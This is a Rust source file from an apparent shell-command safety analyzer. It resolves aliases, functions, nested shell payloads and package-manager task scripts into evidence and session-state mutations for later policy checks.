mod git;
mod argument_fields;
mod bash_job_targets;
mod configuration;
use std::{collections::BTreeMap, path::Path};

use caushell_profile::{
    ArgumentBindingSource, BoundParameter, BoundValue, EffectKind, EffectTarget,
    InvocationRuntimeContext, PathPurpose, PathRole, PayloadLanguage, PayloadSource,
    ProfileRegistry, RecursivePayloadCandidate, RecursivePayloadInput, RecursivePayloadOrigin,
    ResolveInvocationArtifactResult, SemanticType, SessionBindings, SessionValue, SlotName,
    ValueMaterialization, collect_dispatch_command_projection,
    collect_recursive_payload_candidates, materialize_recursive_payload_candidate,
    parse_recursive_payload_candidate, resolve_invocation_artifact_with_bindings,
};
use caushell_runner::{
    BlockDeviceSearchScope, CatastrophicSearchRootScope, ExecutionUnitInheritedScope,
    ExecutionUnitOriginKind, ExecutionUnitOriginLocator, ExecutionUnitResolveRecord,
    NestedPayloadParentRef, NestedPayloadRecord, NestedPayloadRecordId, NestedPayloadResolution,
    ParsedCommandRef, ParsedCommandScope, PendingMutation, ProcessSubstitutionLocationKind,
    RunnerContext, SessionTransformPass, SessionView, StagedSession, DispatchProjectionRecord,
};
use caushell_types::{
    CheckRequest, DerivedInvocationOrigin, Evidence,
    ImplicitInputSource as TypedImplicitInputSource, NestedPayloadContextEvidence,
    NestedPayloadInputEvidence, NestedPayloadInputFragmentEvidence,
    NestedPayloadInputFragmentSnapshot, NestedPayloadLanguageEvidence, NestedPayloadOriginEvidence,
    NestedPayloadParentEvidence, NestedPayloadSourceEvidence,
    NestedPayloadUnresolvedReasonEvidence, RuntimeInputSource, SessionAliasBinding,
    SessionFunctionBinding, UnresolvedExecutionPayloadSubtype,
};
use serde_json::Value as JsonValue;

use crate::path::resolve_path_operand;
use crate::support::config_tasks::decoded_task_arguments;
use crate::support::nested_payload_node_id;
use crate::support::{
    AliasExpansionHop, RuntimeBindingReplay, StaticStreamEvidence, apply_alias_command,
    apply_runtime_variable_bindings_before_span, block_device_path_for_arg_with_optional_cwd,
    bound_argument_operands_for_slot, catastrophic_delete_target_for_arg, expand_alias_chain,
    known_literal_path_content_before_execution_unit as static_known_literal_path_content_before_execution_unit,
    known_literal_path_content_before_scoped_command as static_known_literal_path_content_before_scoped_command,
    known_literal_path_content_before_sequence as static_known_literal_path_content_before_sequence,
    materialize_static_token_text,
    pipeline_has_upstream, process_substitution_evidence, redirection_parent_command_index,
    redirection_targets_stdin_payload, request_variable_bindings,
    runtime_source_bindings_before_span, runtime_variable_overlay,
    runtime_variable_overlay_with_history, runtime_visible_variable_bindings_before_span,
    source_node_id_for_command, static_io_target_evidence,
    static_stdin_evidence_for_scoped_command, top_level_unit_for_command, top_level_unit_for_span,
};

const MAX_ALIAS_EXPANSION_HOPS: usize = 8;
#[cfg(test)]
#[path = "observed_xargs_tests.rs"]
mod observed_xargs_tests;
pub struct ResolveInvocationPass {
    registry: ProfileRegistry,
}

impl ResolveInvocationPass {
    pub fn new(registry: ProfileRegistry) -> Self {
        Self { registry }
    }
}

impl SessionTransformPass for ResolveInvocationPass {
    fn name(&self) -> &'static str {
        "resolve_invocation"
    }

    fn run(&self, session: SessionView<'_>, ctx: &mut RunnerContext) {
        let base = ctx.clone();
        self.run_once(session, ctx, &mut Default::default());
        let mut observed = super::observed_native_inputs::prepare(session, ctx, &self.registry);
        if observed.inputs.is_empty() {
            for proof in observed.effect_proofs {
                super::observed_native_inputs::emit_proof(ctx, proof);
            }
            return;
        }
        let mut candidate = base;
        self.run_once(session, &mut candidate, &mut observed);
        if super::observed_native_inputs::accept(session, &mut candidate, &mut observed) {
            for proof in observed.effect_proofs {
                super::observed_native_inputs::emit_proof(&mut candidate, proof);
            }
            *ctx = candidate;
        } else {
            for proof in &observed.effect_proofs {
                super::observed_native_inputs::emit_proof(ctx, proof.clone());
            }
            super::observed_native_inputs::reject(ctx, &observed, &self.registry);
        }
    }
}

impl ResolveInvocationPass {
    fn run_once(
        &self,
        session: SessionView<'_>,
        ctx: &mut RunnerContext,
        observed: &mut super::observed_native_inputs::ObservedInputs,
    ) {
        let Some(parsed) = ctx.parsed_command().cloned() else {
            return;
        };
        let mut binding_request = ctx.request().clone();
        if let Some((command, defaults)) =
            static_pathname_defaults(&self.registry, ctx, session.summary(), &parsed)
        {
            binding_request.shell_state_before.pathname = Some(defaults);
            ctx.add_evidence(Evidence {
                rule_id: caushell_types::RuleId::SelectionError,
                summary: format!("offline entry model uses default Bash pathname expansion for {command}"),
                kind: caushell_types::EvidenceKind::StaticPathnameDefaults { command: command.into() },
            });
        }
        let entry_summary = static_bash_entry_summary(ctx, session.summary(), &parsed, &binding_request);
        super::configuration_policy::seed_option_environment_defaults(
            &self.registry, session.summary(), ctx, &mut binding_request,
        );
        let staged_session = StagedSession::new(
            session.graph(),
            ctx.request(),
            entry_summary.as_ref().unwrap_or_else(|| session.summary()),
            ctx.pending_mutations(),
        );
        let staged_view = SessionView::from_session(&staged_session);
        let bindings = request_bindings(staged_view.summary(), &binding_request);
        // The overlay and ordinary resolver see the same merged definitions.
        // This is a local analysis view, not new runtime/Harness observations.
        binding_request.shell_state_before.aliases =
            alias_bindings(session.summary(), ctx.request())
                .values()
                .map(|a| caushell_types::ShellAliasSnapshot::new(&a.name, &a.body))
                .collect();
        binding_request.shell_state_before.observability.aliases =
            caushell_types::ShellStateKnowledge::Complete;

        let (records, alias_derived_commands, function_derived_commands, function_scopes) =
            collect_top_level_command_resolve_records(
                &self.registry,
                staged_view,
                &binding_request,
                &parsed,
                ctx.policy().semantic_expansion.max_nested_parse_depth,
            );
        let function_derived_records = collect_top_level_function_command_resolve_records(
            &self.registry,
            &binding_request,
            &function_derived_commands,
        );
        let dispatch_derived_commands =
            collect_top_level_dispatch_derived_commands(
                &self.registry,
                staged_view.summary(),
                &binding_request,
                &parsed,
                &records,
            );
        let dispatch_derived_records = collect_top_level_dispatch_command_resolve_records(
            &self.registry,
            &binding_request,
            &dispatch_derived_commands,
        );

        let (mut nested_payload_records, payload_source_contexts) = collect_nested_payload_records(
            &self.registry,
            staged_view,
            staged_view.summary(),
            &binding_request,
            &parsed,
            &records,
            &function_derived_commands,
            &function_derived_records,
            &dispatch_derived_commands,
            &dispatch_derived_records,
            &bindings,
            ctx.policy().semantic_expansion.max_nested_parse_depth,
        );
        let nested_derived_records = collect_derived_command_resolve_records(
            &self.registry,
            &binding_request,
            &nested_payload_records,
        );
        let mut derived_records = dispatch_derived_records.clone();
        derived_records.extend(function_derived_records.clone());
        derived_records.extend(nested_derived_records);
        let mut pathname_context = ctx.clone();
        let (
            mut execution_unit_resolve_records,
            expansion_limit_evidence,
            derived_payloads,
            shell_redirection_scopes,
            canonical_inline_payload_ids,
            expanded_function_calls,
        ) = collect_execution_unit_resolve_records(
            &self.registry,
            staged_view,
            &binding_request,
            &parsed,
            &records,
            &function_derived_commands,
            &function_derived_records,
            &function_scopes,
            &dispatch_derived_commands,
            &dispatch_derived_records,
            &nested_payload_records,
            &payload_source_contexts,
            ctx.policy().semantic_expansion.max_nested_parse_depth,
            observed,
            &mut pathname_context,
        );
        let refined_argument_nodes = pathname_context.evidence.iter().filter_map(|e| {
            if let caushell_types::EvidenceKind::ShellArgumentFields(p) = &e.kind {
                Some(p.node_id.clone())
            } else { None }
        }).collect();
        argument_fields::refresh_legacy_inline_payloads(
            &mut nested_payload_records, &derived_payloads, &execution_unit_resolve_records,
            &refined_argument_nodes, ctx.policy().semantic_expansion.max_nested_parse_depth,
        );
        for evidence in pathname_context.evidence.into_iter().filter(|e| {
            matches!(
                e.kind,
                caushell_types::EvidenceKind::PathnameFields(_)
                    | caushell_types::EvidenceKind::ToolOptionEnvironment(_)
                    | caushell_types::EvidenceKind::ToolConfigInput(_)
                    | caushell_types::EvidenceKind::ToolConfigParse(_)
                    | caushell_types::EvidenceKind::ShellArgumentFields(_)
            )
        }) {
            ctx.add_evidence(evidence);
        }
        // The legacy payload traversal and canonical execution frontier share
        // source positions, not node IDs. Reattach descendant payloads only
        // after their parsed parent has a proven canonical execution unit.
        let mut canonical_payload_children = BTreeMap::new();
        for payload in &nested_payload_records {
            if !canonical_inline_payload_ids.contains(&payload.record_id.0) {
                continue;
            }
            let NestedPayloadResolution::Parsed { parsed: body, .. } = &payload.resolution else {
                continue;
            };
            let parent = match &payload.parent_ref {
                NestedPayloadParentRef::RootCommand { command_index } => records
                    .iter()
                    .find(|r| r.command_ref.command_index == *command_index)
                    .map(|r| r.source_node_id.clone()),
                NestedPayloadParentRef::DerivedInvocation { node_id } => Some(
                    canonical_payload_children
                        .get(node_id)
                        .unwrap_or(node_id)
                        .clone(),
                ),
            };
            let Some(parent) = parent else {
                continue;
            };
            for unit in execution_unit_resolve_records.iter().filter(|unit| {
                unit.origin_kind == ExecutionUnitOriginKind::ShellCommandStringPayload
                    && unit.parent_execution_node_id == parent
                    && unit.parsed_scope == *body
            }) {
                canonical_payload_children.insert(
                    derived_invocation_node_id(
                        &binding_request.session_id,
                        binding_request.sequence_no,
                        payload.record_id.0,
                        unit.command_ref.command_index,
                    ),
                    unit.source_node_id.clone(),
                );
            }
        }
        for payload in &mut nested_payload_records {
            if let NestedPayloadParentRef::DerivedInvocation { node_id } = &mut payload.parent_ref {
                if let Some(canonical) = canonical_payload_children.get(node_id) {
                    *node_id = canonical.clone();
                }
            }
        }
        nested_payload_records.extend(derived_payloads);
        super::callback_completeness::validate(
            &mut execution_unit_resolve_records,
            &nested_payload_records,
        );
        for decode in observed.decoded.values() {
            ctx.add_evidence(Evidence {
                rule_id: caushell_types::RuleId::SelectionError,
                summary: "native input decoding".into(),
                kind: caushell_types::EvidenceKind::NativeInputDecode(decode.clone()),
            });
        }
        for evidence in expansion_limit_evidence {
            ctx.add_evidence(evidence);
        }
        bash_job_targets::resolve_empty_job_targets(
            ctx, session.summary(), &parsed, &self.registry, &mut execution_unit_resolve_records,
        );
        let dispatch_records = project_dispatch_records(
            &self.registry, ctx.request(), &execution_unit_resolve_records,
        );
        ctx.set_dispatch_projection_records(dispatch_records);
        ctx.set_execution_unit_resolve_records(execution_unit_resolve_records);
        let read_envelopes=ctx.execution_unit_resolve_records().iter().filter_map(|record| {
            matches!(&record.result,ResolveInvocationArtifactResult::Resolved(r) if r.bound.native_argv_effect_envelope.is_some())
                .then(|| caushell_types::NativeInputEffectEvidence {
                    bound_effects:None,
                    control_envelope:true,effect_envelope:match &record.result {ResolveInvocationArtifactResult::Resolved(r)=>r.bound.native_argv_effect_envelope,_=>None},node_id:record.parent_execution_node_id.0.clone(),
                    producer_node_id:record.parent_execution_node_id.0.clone(),
                    child_node_ids:vec![record.source_node_id.0.clone()],
                    observation_gap:"native argv remains symbolic; all admitted modes retain their declared effect class and input dependencies".into(),
                })
        }).collect::<Vec<_>>();
        for proof in read_envelopes {
            super::observed_native_inputs::emit_proof(ctx, proof);
        }
        ctx.set_expanded_function_calls(expanded_function_calls);
        ctx.set_shell_redirection_scopes(shell_redirection_scopes);
        ctx.set_parsed_command_scopes(project_parsed_command_scopes(
            ctx.request(),
            &function_derived_commands,
            &nested_payload_records,
            ctx.execution_unit_resolve_records(),
        ));
        for command in &alias_derived_commands {
            ctx.stage_mutation(project_alias_derived_invocation_mutation(
                ctx.request(),
                command,
            ));
        }

        for command in &function_derived_commands {
            ctx.stage_mutation(project_function_derived_invocation_mutation(
                ctx.request(),
                command,
            ));
        }

        for command in &dispatch_derived_commands {
            ctx.stage_mutation(project_dispatch_derived_invocation_mutation(
                ctx.request(),
                command,
            ));
        }

        for record in &nested_payload_records {
            ctx.stage_mutation(project_nested_payload_mutation(ctx.request(), record));
            for mutation in project_derived_invocation_mutations(ctx.request(), record) {
                ctx.stage_mutation(mutation);
            }
            if let Some(evidence) = project_nested_payload_evidence_with_runtime_state(
                &self.registry,
                &binding_request,
                &bindings,
                record,
                &parsed,
            ) {
                ctx.add_evidence(evidence);
            }
        }

        for mutation in project_execution_unit_derived_invocation_mutations(
            ctx.request(),
            ctx.pending_mutations(),
            ctx.execution_unit_resolve_records(),
        ) {
            ctx.stage_mutation(mutation);
        }

        let syntax_sequence_no = ctx.request().sequence_no;
        let syntax_mutations = ctx
            .shell_redirection_scopes()
            .iter()
            .enumerate()
            .flat_map(|(scope_index, scope)| {
                scope
                    .units
                    .iter()
                    .enumerate()
                    .map(
                        move |(statement_index, unit)| PendingMutation::AddDerivedInvocation {
                            node_id: unit.source_node_id.clone(),
                            root_command_sequence_no: syntax_sequence_no,
                            origin: DerivedInvocationOrigin::ShellRedirection {
                                scope_index,
                                statement_index,
                            },
                            derived_command_index: statement_index,
                            raw_text: unit.opening_statement.text.clone(),
                            command_name: None,
                            shell_kind: scope.parsed.shell_kind,
                            depth: scope.depth,
                            parent_node_id: scope.parent_execution_node_id.clone(),
                            relation_from_parent: caushell_graph::EdgeKind::ExpandsTo,
                        },
                    )
            })
            .collect::<Vec<_>>();
        for mutation in syntax_mutations {
            ctx.stage_mutation(mutation);
        }

        ctx.set_nested_payload_records(nested_payload_records);
        let final_overlay = runtime_variable_overlay_with_history(
            &self.registry,
            &binding_request,
            bindings,
            &parsed,
            ctx.request().sequence_no,
            ctx.policy().analysis_budget.clone(),
            caushell_query::QuerySession::new(staged_view.graph(), staged_view.summary()),
        );
        if let Some(reason) = final_overlay.bindings.shell_state_uncertainty() {
            if !final_overlay.bindings.shell_state_join_only() {
                ctx.propose_decision(
                    self.name(),
                    caushell_types::RuleId::SelectionError,
                    caushell_types::Decision::NeedApproval,
                    reason,
                );
            }
            ctx.stage_mutation(PendingMutation::SetShellStateUncertainty {
                reason: Some(reason.to_owned()),
                observed_at: ctx.request().sequence_no,
            });
        } else if session.summary().shell_state_uncertainty().is_some() {
            ctx.stage_mutation(PendingMutation::SetShellStateUncertainty {
                reason: None,
                observed_at: ctx.request().sequence_no,
            });
        }
        let initial_aliases = request_bindings(session.summary(), ctx.request());
        let names = initial_aliases
            .retained_alias_bindings()
            .map(|b| b.name.clone())
            .chain(
                final_overlay
                    .bindings
                    .retained_alias_bindings()
                    .map(|b| b.name.clone()),
            )
            .collect::<std::collections::BTreeSet<_>>();
        for name in names {
            if initial_aliases
                .retained_alias_bindings()
                .find(|b| b.name == name)
                == final_overlay
                    .bindings
                    .retained_alias_bindings()
                    .find(|b| b.name == name)
            {
                continue;
            }
            let mutation = if let Some(binding) = final_overlay
                .bindings
                .retained_alias_bindings()
                .find(|b| b.name == name)
            {
                PendingMutation::UpsertAliasBinding {
                    binding: binding.clone(),
                }
            } else {
                PendingMutation::UnsetAlias {
                    name,
                    observed_at: ctx.request().sequence_no,
                }
            };
            ctx.stage_mutation(mutation);
        }
        ctx.set_shell_state_fences(final_overlay.state_fences);
        if let Some(capture) = final_overlay.state_capture {
            for budget in capture.incomplete {
                ctx.mark_analysis_incomplete(
                    budget,
                    "ordered state capture exceeded its analysis budget",
                );
            }
            let capabilities = ctx.request().runtime.shell_runtime_capabilities;
            for (index, observation) in capture.observations.into_iter().enumerate() {
                use caushell_types::{SafetyScope, SafetyStateKind as K, SafetyStateValue as V};
                let persistent = match observation.kind {
                    K::Variable => match &observation.value {
                        V::Variable { exported, .. } => capabilities.persists_variable(*exported),
                        _ => {
                            capabilities.persists_variables
                                || capabilities.persists_exported_environment
                        }
                    },
                    K::Function => capabilities.persists_functions,
                    K::Alias => capabilities.persists_aliases,
                    K::Positionals => capabilities.persists_positionals,
                    _ => false,
                };
                let scope = if persistent {
                    SafetyScope::Shell
                } else {
                    SafetyScope::Invocation {
                        sequence_no: ctx.request().sequence_no,
                    }
                };
                let object = caushell_types::SafetyObject {
                    scope,
                    kind: observation.kind,
                    name: observation.name,
                };
                // Reuse entry witnesses already in history. Write candidates
                // retain their own request and source position.
                if observation.source_end == 0
                    && !matches!(observation.value, V::Unknown)
                    && !observation.value.has_structured_unknown()
                    && session
                        .graph()
                        .state_candidate_nodes(&object)
                        .take(ctx.policy().analysis_budget.max_history_nodes)
                        .any(|node| {
                            matches!(&node.kind, caushell_graph::NodeKind::StateCandidate { fact }
                            if fact.value == observation.value
                                && fact.sequence_no < ctx.request().sequence_no)
                        })
                {
                    continue;
                }
                ctx.stage_mutation(PendingMutation::AddStateCandidate {
                    // Length-prefix the session ID; no lossy hash is used as
                    // the identity of a security-relevant history fact.
                    node_id: caushell_graph::NodeId::new(format!(
                        "state-candidate:replay:{}:{}:{}:{}",
                        ctx.request().session_id.0.len(),
                        ctx.request().session_id.0,
                        ctx.request().sequence_no.0,
                        index
                    )),
                    fact: caushell_types::StateCandidateFact {
                        object,
                        value: observation.value,
                        sequence_no: ctx.request().sequence_no,
                        source_end: observation.source_end,
                    },
                });
            }
        }
        ctx.set_runtime_function_mutations(final_overlay.function_mutations);
        let mut mutations: Vec<PendingMutation> = final_overlay
            .touched
            .into_iter()
            .chain(final_overlay.assigned)
            .collect::<std::collections::BTreeSet<_>>()
            .into_iter()
            .map(|name| match final_overlay.bindings.get(&name) {
                Some(value) => PendingMutation::UpsertVariableBinding {
                    binding: caushell_types::SessionVariableBinding::new(
                        &name,
                        value.value.to_session_variable_value(),
                        matches!(
                            final_overlay.bindings.environment_value(&name),
                            caushell_profile::EnvironmentValueRef::Present(_)
                        ),
                        ctx.request().sequence_no,
                    ),
                },
                None => PendingMutation::UnsetVariable {
                    name,
                    observed_at: ctx.request().sequence_no,
                },
            })
            .collect();
        if let Some(positional) = final_overlay.positional_state {
            mutations.push(match positional {
                crate::support::PositionalParameterMutation::Forget => {
                    PendingMutation::ForgetPositionalParameters {
                        observed_at: ctx.request().sequence_no,
                    }
                }
                crate::support::PositionalParameterMutation::Replace(values) => {
                    PendingMutation::SetPositionalParameters {
                        values: values
                            .iter()
                            .map(SessionValue::to_session_variable_value)
                            .collect(),
                        observed_at: ctx.request().sequence_no,
                    }
                }
                crate::support::PositionalParameterMutation::Shift(_) => {
                    unreachable!("final overlay stores the resulting positional values")
                }
            });
        }
        ctx.set_runtime_variable_final_mutations(mutations);
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct ResolvedCommandSeed {
    source_node_id: caushell_graph::NodeId,
    command_ref: ParsedCommandRef,
    result: ResolveInvocationArtifactResult,
}

impl ResolvedCommandSeed {
    fn new(
        source_node_id: caushell_graph::NodeId,
        command_ref: ParsedCommandRef,
        result: ResolveInvocationArtifactResult,
    ) -> Self {
        Self {
            source_node_id,
            command_ref,
            result,
        }
    }
}

fn static_pathname_defaults<'a>(
    registry: &ProfileRegistry,
    ctx: &RunnerContext,
    summary: &caushell_types::SessionSummary,
    parsed: &'a caushell_parse::ParsedCommandArtifact,
) -> Option<(&'a str, caushell_types::ShellPathnameSnapshot)> {
    use caushell_types::{ShellEnvironmentValue, ShellPathnameSnapshot};

    let request = ctx.request();
    let state = &request.shell_state_before;
    if !ctx.assumes_protected_defaults()
        || request.shell_kind != caushell_types::ShellKind::Bash
        || request.runtime.shell_runtime_capabilities
            != caushell_types::ShellRuntimeCapabilities::request_only()
        || request.sequence_no != caushell_types::CommandSequenceNo(1)
        || summary.last_sequence_no().is_some()
        || state.pathname.is_some()
        || state.execution_frame.is_some()
        || summary.shell_state_uncertainty().is_some()
        || parsed.status != caushell_parse::ParseStatus::Complete
    {
        return None;
    }
    let [command] = parsed.commands.as_slice() else {
        return None;
    };
    let name = command.command_name.as_deref()?;
    let profile = registry.lookup(name).profile?;
    if profile.trust.source != caushell_profile::ProfileSourceKind::BuiltIn
        || name != profile.primary_name()
        || command.command_name_runtime_data
        || command.shell_scope_span.is_some()
        || command.text.trim() != parsed.raw_command.trim()
        || command.terminator == Some(caushell_parse::StatementTerminator::Background)
        || !command.prefix_assignments.is_empty()
        || !parsed.redirections.is_empty()
        || state.aliases.iter().any(|alias| alias.name == name)
        || state.functions.iter().any(|function| function.name == name)
        || summary.alias_binding(name).is_some()
        || summary.function_binding(name).is_some()
        || state.environment.iter().any(|entry| entry.name.starts_with("BASH_FUNC_"))
    {
        return None;
    }
    let startup_controls = [
        "BASH_ENV", "ENV", "BASHOPTS", "SHELLOPTS", "GLOBIGNORE", "POSIXLY_CORRECT",
        "LC_ALL", "LC_COLLATE", "LC_CTYPE", "LANG",
    ];
    if startup_controls.into_iter().any(|name| {
        state.environment.iter().any(|entry| entry.name == name)
            || state.variables.iter().any(|entry| entry.name == name)
            || summary.variable_binding(name).is_some()
    }) {
        return None;
    }
    if !profile.static_bash_pathname_defaults.as_ref()?.matches_invocation(&command.tokens) {
        return None;
    }
    // These patterns need neither locale-dependent character classes nor
    // case folding. Use the C matcher for the independent default entry.
    Some((name, ShellPathnameSnapshot {
        noglob: false,
        nullglob: false,
        failglob: false,
        dotglob: false,
        nocaseglob: false,
        globstar: false,
        extglob: false,
        globskipdots: true,
        globignore: ShellEnvironmentValue::Absent,
        lc_all: ShellEnvironmentValue::Present { value: "C".into() },
        lc_collate: ShellEnvironmentValue::Absent,
        lc_ctype: ShellEnvironmentValue::Absent,
        lang: ShellEnvironmentValue::Absent,
    }))
}

fn static_bash_entry_summary(
    ctx: &mut RunnerContext,
    summary: &caushell_types::SessionSummary,
    parsed: &caushell_parse::ParsedCommandArtifact,
    request: &CheckRequest,
) -> Option<caushell_types::SessionSummary> {
    use caushell_types::{
        CommandSequenceNo, EvidenceKind, RuleId, ShellKind, ShellRuntimeCapabilities,
        ShellStateKnowledge,
    };

    let state = &request.shell_state_before;
    if !ctx.assumes_protected_defaults()
        || request.shell_kind != ShellKind::Bash
        || request.sequence_no != CommandSequenceNo(1)
        || request.runtime.shell_runtime_capabilities != ShellRuntimeCapabilities::request_only()
        || state.execution_frame.is_some()
        || state.observability.variables != ShellStateKnowledge::Unknown
        || summary.last_sequence_no().is_some()
        || summary.shell_state_uncertainty().is_some()
        || parsed.status != caushell_parse::ParseStatus::Complete
        || !Path::new(state.cwd()).is_absolute()
        || state.cwd().contains('\0')
        || !state.aliases.is_empty()
        || !state.functions.is_empty()
        || summary.alias_bindings().next().is_some()
        || summary.function_bindings().next().is_some()
    {
        return None;
    }

    if state
        .environment
        .iter()
        .map(|binding| binding.name.as_str())
        .chain(state.variables.iter().map(|binding| binding.name.as_str()))
        .any(|name| {
            matches!(name, "BASH_ENV" | "ENV" | "BASHOPTS" | "SHELLOPTS" | "POSIXLY_CORRECT")
                || name.starts_with("BASH_FUNC_")
        })
    {
        return None;
    }

    // These are entry bindings in the private resolver view, including the
    // unexported IFS. Later shell-state effects still replay in source order.
    let mut entry = None;
    for (name, value, exported) in [("PWD", state.cwd(), true), ("IFS", " \t\n", false)] {
        if state.environment.iter().any(|binding| binding.name == name)
            || state.variables.iter().any(|binding| binding.name == name)
            || summary.variable_binding(name).is_some()
        {
            continue;
        }
        entry.get_or_insert_with(|| summary.clone()).set_exact_scalar_variable(
            name,
            value,
            exported,
            CommandSequenceNo(0),
        );
        ctx.add_evidence(Evidence {
            rule_id: RuleId::SelectionError,
            summary: format!("offline independent Bash entry supplies the initial {name}"),
            kind: EvidenceKind::StaticBashEntryVariable { name: name.into() },
        });
    }
    let variants = ctx.protected_native_variants();
    if !variants.is_empty()
        && !state.environment.iter().map(|binding| binding.name.as_str())
            .chain(state.variables.iter().map(|binding| binding.name.as_str()))
            .any(|name| {
                matches!(name, "PATH" | "BASH_CMDS")
                    || name.starts_with("LD_") || name.starts_with("DYLD_")
            })
    {
        entry.get_or_insert_with(|| summary.clone()).set_protected_native_variants(variants.clone());
    }
    entry
}

fn request_bindings(
    summary: &caushell_types::SessionSummary,
    request: &CheckRequest,
) -> SessionBindings {
    request_variable_bindings(summary, request)
}

fn runtime_binding_replay<'a>(
    registry: &'a ProfileRegistry,
    request: &'a CheckRequest,
    bindings: &'a SessionBindings,
) -> RuntimeBindingReplay<'a> {
    RuntimeBindingReplay {
        registry,
        request,
        bindings,
    }
}

/// A path-valued execution effect without a language decoder is an opaque
/// program input. Resolving its location does not interpret its bytes as Bash.
fn configured_payload_frontier_entries(
    registry: &ProfileRegistry,
    request: &CheckRequest,
    parsed: &caushell_parse::ParsedCommandArtifact,
    command_index: usize,
    bound: &caushell_profile::BoundInvocation,
    record: crate::support::ExecutionResolveRecordRef<'_>,
    bindings: &SessionBindings,
    scope_base_bindings: &SessionBindings,
    scope_entry_cwd: &caushell_runner::EffectiveCwd,
    parent_ref: NestedPayloadParentRef,
    root_command_index: usize,
    depth: u8,
) -> Vec<FrontierEntry> {
    let declared = |effect: &caushell_profile::Effect| {
        effect.kind == EffectKind::ExecutePayload
            && matches!(
                effect.target,
                EffectTarget::ConfiguredPath(_) | EffectTarget::ToolConventionPath(_)
            )
    };
    if !bound.effects.iter().any(declared) {
        return Vec::new();
    }
    let cwd = source_payload_cwd(
        registry,
        request,
        parsed,
        command_index,
        scope_base_bindings,
        scope_entry_cwd,
    );
    let home = bindings.tilde_home_with_default(request.home.as_deref());
    let mut entries = Vec::new();
    for (index, effect) in bound
        .effects
        .iter()
        .enumerate()
        .filter(|(_, e)| declared(e))
    {
        for case in crate::path::effective_cwd_cases(Some(&cwd), request.shell_state_before.cwd()) {
            let base = case.resolution_base(request.shell_state_before.cwd());
            let (resolution, dependent) = match &effect.target {
                EffectTarget::ConfiguredPath(target) => {
                    let Some(path) = crate::path::resolve_configured_path(
                        bound,
                        target,
                        base,
                        home,
                        Some(record),
                    ) else {
                        continue;
                    };
                    (path.resolution, path.cwd_dependent)
                }
                EffectTarget::ToolConventionPath(target) => (
                    caushell_types::PathResolution::Concrete {
                        path: if target.path.starts_with('/') {
                            crate::path::normalize_shell_path(&target.path)
                        } else {
                            crate::path::join_shell_path(base, &target.path)
                        },
                    },
                    !target.path.starts_with('/'),
                ),
                _ => unreachable!(),
            };
            let resolution = crate::path::project_path_at_cwd(resolution, dependent, case);
            let path = resolution
                .concrete_path()
                .map(str::to_owned)
                .unwrap_or_else(|| format!("<unresolved configured program: {resolution:?}>"));
            let task_name = format!("configured-payload:{index}");
            if entries.iter().any(|entry: &FrontierEntry| {
                matches!(&entry.candidate.origin,
                RecursivePayloadOrigin::ConfigDefinedTask {config_path, task_name: name}
                if config_path == &path && name == &task_name)
            }) {
                continue;
            }
            entries.push(FrontierEntry {
                parent_ref: parent_ref.clone(), root_command_index, depth,
                candidate: RecursivePayloadCandidate {
                    language: PayloadLanguage::Opaque,
                    source: PayloadSource::DynamicReference,
                    origin: RecursivePayloadOrigin::ConfigDefinedTask {config_path: path.clone(), task_name},
                    input: RecursivePayloadInput::ArgumentFragments {fragments: vec![
                        caushell_profile::RecursivePayloadArgumentFragment {
                            text: path, quoted: true, node_kind: "raw_string".into(),
                            span: parsed.commands[command_index].span.clone(),
                            materialization: caushell_profile::RecursivePayloadFragmentMaterialization::DecodedLiteral,
                        }
                    ]},
                },
                bindings: bindings.clone(), positional_args: None,
                scope_entry_cwd: cwd.clone(), source_scopes: Vec::new(),
            });
        }
    }
    entries.reverse();
    entries
}

fn config_defined_task_frontier_entries(
    registry: &ProfileRegistry,
    session: SessionView<'_>,
    request: &CheckRequest,
    parsed: &caushell_parse::ParsedCommandArtifact,
    command_index: usize,
    bound: &caushell_profile::BoundInvocation,
    bindings: &SessionBindings,
    scope_base_bindings: &SessionBindings,
    scope_entry_cwd: &caushell_runner::EffectiveCwd,
    source_scopes: &[PayloadSourceScope],
    parent_ref: NestedPayloadParentRef,
    root_command_index: usize,
    depth: u8,
) -> Vec<FrontierEntry> {
    use crate::support::config_tasks::{
        ManifestTaskDialect, TaskSelection, composer_tasks, quote_task_argument, yarn_task_name,
        yarn_task_selection, yarn_tasks,
    };
    if bound.native_configuration_resolved && bound.command_name.as_str() == "git" {
        return Vec::new();
    }
    let Some((dialect, target_path)) = ManifestTaskDialect::for_invocation(bound) else {
        return Vec::new();
    };
    let yarn_arguments =
        (dialect == ManifestTaskDialect::Yarn).then(|| decoded_task_arguments(bound, "arguments"));
    let ignore_install_scripts = bound
        .applied_modifiers
        .iter()
        .any(|m| m.as_str() == "ignore_install_scripts");
    let yarn_selection = yarn_arguments.as_ref().map(|args| {
        args.as_ref().map_or(TaskSelection::Unresolved, |args| {
            yarn_task_selection(args, ignore_install_scripts)
        })
    });
    if yarn_selection == Some(TaskSelection::NoTask) {
        return Vec::new();
    }
    let task_name = match (dialect, bound.form_id.as_str()) {
        (ManifestTaskDialect::Yarn, _) => yarn_arguments
            .as_ref()
            .and_then(Option::as_ref)
            .and_then(|args| yarn_task_name(args).map(str::to_owned)),
        (_, "run_script") => decoded_task_arguments(bound, "script_name")
            .and_then(|v| (v.len() == 1).then(|| v[0].clone())),
        (_, "test_script") => Some("test".to_string()),
        _ => None,
    };
    let observations = source_scope_observations(
        registry,
        request,
        parsed,
        command_index,
        scope_base_bindings,
    );
    let (shell_cwds, execution_cwds) = super::compute_effective_cwd::source_scope_execution_cwds(
        parsed,
        request,
        scope_entry_cwd,
        &observations,
    );
    let base = shell_cwds
        .get(command_index)
        .cloned()
        .unwrap_or(caushell_runner::EffectiveCwd::Unknown);
    let cwd = super::compute_effective_cwd::source_invocation_execution_cwd(
        bound,
        &base,
        bindings,
        request.home.as_deref(),
    );
    let config_path = match &cwd {
        caushell_runner::EffectiveCwd::Known(cwd) => {
            crate::path::normalize_shell_path(&resolve_conventional_path(cwd, target_path))
        }
        _ => target_path.to_string(),
    };
    let mut child_bindings = crate::support::command_environment_bindings(
        bindings,
        parsed,
        &ParsedCommandRef::new(command_index, parsed.commands[command_index].span.clone()),
    );
    child_bindings.enter_child_shell_environment();
    let task_shells = decoded_task_arguments(bound, "task_shell");
    let task_shell = task_shells
        .as_ref()
        .and_then(|shells| shells.last())
        .map(String::as_str)
        .or_else(
            || match child_bindings.environment_value("npm_config_script_shell") {
                caushell_profile::EnvironmentValueRef::Present(SessionValue::ExactScalar(
                    shell,
                )) if dialect == ManifestTaskDialect::Npm => Some(shell.as_str()),
                _ => None,
            },
        );
